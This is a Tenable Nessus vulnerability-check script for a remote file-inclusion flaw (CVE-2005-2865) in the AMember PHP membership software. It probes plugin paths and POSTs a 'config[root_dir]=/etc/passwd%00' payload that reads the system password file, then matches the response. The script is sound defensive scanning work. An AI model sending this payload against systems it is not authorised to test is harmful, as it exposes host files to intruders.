#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(19599);
  script_version ("$Revision: 1.10 $");

  script_cve_id("CVE-2005-2865");
  script_bugtraq_id(14777);
  script_xref(name:"OSVDB", value:"19439");
  script_xref(name:"OSVDB", value:"19440");
  script_xref(name:"OSVDB", value:"19441");
  script_xref(name:"OSVDB", value:"19442");
  script_xref(name:"OSVDB", value:"19443");
  script_xref(name:"OSVDB", value:"19444");
  script_xref(name:"OSVDB", value:"19445");
  script_xref(name:"OSVDB", value:"19446");
  script_xref(name:"OSVDB", value:"19447");
  script_xref(name:"OSVDB", value:"19448");
  script_xref(name:"OSVDB", value:"19449");
  script_xref(name:"OSVDB", value:"19450");
  script_xref(name:"OSVDB", value:"19451");
  script_xref(name:"OSVDB", value:"19452");
  script_xref(name:"OSVDB", value:"19453");
  script_xref(name:"OSVDB", value:"19454");
  script_xref(name:"OSVDB", value:"19455");
  script_xref(name:"OSVDB", value:"19456");
  script_xref(name:"OSVDB", value:"19457");

  script_name(english:"AMember Multiple Script config[root_dir] Parameter Remote File Inclusion");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web site contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running AMember, a commercial membership
and subscription management script written in PHP. 

The version of AMember installed on the remote host fails to properly
sanitize user-supplied input to the 'config[root_dir]' parameter
before using it in several scripts to include PHP code.  Provided
PHP's 'register_globals' setting is enabled, an attacker may be able
to leverage these flaws to view arbitrary files on the remote host and
execute arbitrary PHP code, possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2005-09/0055.html" );
 script_set_attribute(attribute:"solution", value:
"Disable PHP's 'register_globals' setting." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  summary["english"] = "Checks for config[root_dir] parameter file include vulnerability in AMember";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
 
  script_dependencies("http_version.nasl", "no404.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);
if (get_kb_item("www/no404/"+port)) exit(0);


# Various directories and scripts to test.
if (thorough_tests) {
  dirs = list_uniq(make_list("/amember", cgi_dirs()));
  scripts = make_list(
    "/plugins/db/mysql/mysql.inc.php",
    "/plugins/payment/efsnet/efsnet.inc.php",
    "/plugins/payment/theinternetcommerce/theinternetcommerce.inc.php",
    "/plugins/payment/cdg/cdg.inc.php",
    "/plugins/payment/compuworld/compuworld.inc.php",
    "/plugins/payment/directone/directone.inc.php",
    "/plugins/payment/authorize_aim/authorize_aim.inc.php",
    "/plugins/payment/beanstream/beanstream.inc.php",
    "/plugins/payment/echo/config.inc.php",
    "/plugins/payment/eprocessingnetwork/eprocessingnetwork.inc.php",
    "/plugins/payment/eway/eway.inc.php",
    "/plugins/payment/linkpoint/linkpoint.inc.php",
    "/plugins/payment/logiccommerce/logiccommerce.inc.php",
    "/plugins/payment/netbilling/netbilling.inc.php",
    "/plugins/payment/payflow_pro/payflow_pro.inc.php",
    "/plugins/payment/paymentsgateway/paymentsgateway.inc.php",
    "/plugins/payment/payos/payos.inc.php",
    "/plugins/payment/payready/payready.inc.php",
    "/plugins/payment/plugnplay/plugnplay.inc.php"
  );
}
else {
  dirs = make_list(cgi_dirs());
  scripts = make_list(
    "/plugins/db/mysql/mysql.inc.php"
  );
}


# Loop through various directories.
foreach dir (dirs) {
  foreach script (scripts) {
    # Check whether the script exists.
    r = http_send_recv3(method:"GET", item:string(dir, "/", script), port:port);
    if (isnull(r)) exit(0);

    # If it does, try to exploit it.
    if (r[0] =~ "^HTTP/.* 200 OK") {
      postdata = string("config[root_dir]=/etc/passwd%00");
      r = http_send_recv3(method:"POST ", version: 11, port: port,
      	item: string(dir, "/", script), data: postdata,
	add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
      if (isnull(r)) exit(0);
      res = r[2];

      # There's a problem if...
      if (
        # there's an entry for root or...
        egrep(string:res, pattern:"root:.*:0:[01]:") ||
        # we get an error saying "failed to open stream" or "Failed opening".
        #
        # nb: this suggests magic_quotes_gpc was enabled but passing
        #     remote URLs might still work.
        egrep(string:res, pattern:"Warning.+main\(/etc/passwd.+failed to open stream") ||
        egrep(string:res, pattern:"Failed opening .*'/etc/passwd")
      ) {
        security_warning(port);
        exit(0);
      }
    }
  }
}
